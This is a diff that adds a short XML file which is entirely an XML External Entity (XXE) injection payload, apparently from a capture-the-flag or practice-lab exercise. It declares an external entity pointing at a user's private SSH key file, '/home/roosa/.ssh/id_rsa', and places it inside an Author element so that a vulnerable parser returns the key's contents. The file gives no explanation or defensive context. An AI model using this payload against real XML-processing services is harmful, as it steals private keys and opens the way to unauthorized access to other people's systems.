@@ -1,0 +1,6 @@
+<!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
+<elements>
+    <Author>&xxe;</Author>
+</elements>
